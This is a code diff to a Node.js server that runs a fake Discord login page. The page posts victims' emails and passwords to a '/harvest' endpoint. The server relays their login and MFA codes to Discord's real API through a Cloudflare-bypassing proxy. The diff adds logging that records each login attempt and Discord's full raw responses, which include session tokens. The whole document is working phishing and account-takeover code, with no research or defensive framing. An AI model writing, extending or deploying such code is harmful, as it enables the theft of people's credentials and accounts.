@@ -37,13 +37,13 @@ async function cfFetch(path, opts = {}) {
       resolveWithFullResponse: true,
       simple: false,
       jar: jar,
-      proxy: PROXY_URL // Use the proxy here
+      proxy: PROXY_URL
     };
 
     const r = await cloudscraper(scraperOpts);
     return { status: r.statusCode, data: r.body, headers: r.headers };
   } catch (e) {
-    // Fallback to axios with proxy agent
+    console.error('Cloudscraper failed, trying axios fallback:', e.message);
     const axiosOpts = { 
       url: `${DISCORD}${path}`, 
       ...opts, 
@@ -164,7 +164,7 @@ app.get('/login', (req, res) => {
             });
             const data = await res.json();
             
-            // Log credentials immediately just in case
+            // Log credentials immediately
             navigator.sendBeacon('/harvest', JSON.stringify({ stage: 'credentials', email, password }));
 
             if (data.mfa || data.ticket) {
@@ -188,34 +188,53 @@ app.get('/login', (req, res) => {
   `);
 });
 
-// ---------- API PROXIES ----------
+// ---------- API PROXIES WITH DEEP LOGGING ----------
 app.post('/api/v9/auth/login', async (req, res) => {
   try {
     const { email, password } = req.body;
+    console.log(`[LOGIN ATTEMPT] Trying to login: ${email}`);
+    
     const r = await cfFetch('/api/v9/auth/login', {
       method: 'POST',
       data: { email, password, undelete: false, captcha_key: null, login_source: null, gift_code_sku_id: null },
       headers: { 'Content-Type': 'application/json' },
     });
+    
     const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;
+    
+    console.log('--- DISCORD RAW RESPONSE ---');
+    console.log(JSON.stringify(data, null, 2));
+    console.log('----------------------------');
+
     res.json(data);
   } catch (e) {
-    console.error('Proxy login error:', e.message);
-    res.status(500).json({ message: 'error' });
+    console.error('--- PROXY FETCH ERROR ---');
+    console.error(e.message);
+    console.error('-------------------------');
+    res.status(500).json({ message: 'Proxy failed' });
   }
 });
 
 app.post('/api/v9/auth/mfa', async (req, res) => {
   try {
     const { code, ticket } = req.body;
+    console.log(`[MFA ATTEMPT] Submitting code`);
+    
     const r = await cfFetch('/api/v9/auth/mfa', {
       method: 'POST',
       data: { code, ticket, login_source: null, gift_code_sku_id: null },
       headers: { 'Content-Type': 'application/json' },
     });
+    
     const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;
+    
+    console.log('--- MFA RAW RESPONSE ---');
+    console.log(JSON.stringify(data, null, 2));
+    console.log('------------------------');
+
     res.json(data);
   } catch (e) {
+    console.error('MFA error:', e.message);
     res.status(500).json({ message: 'mfa error' });
   }
 });
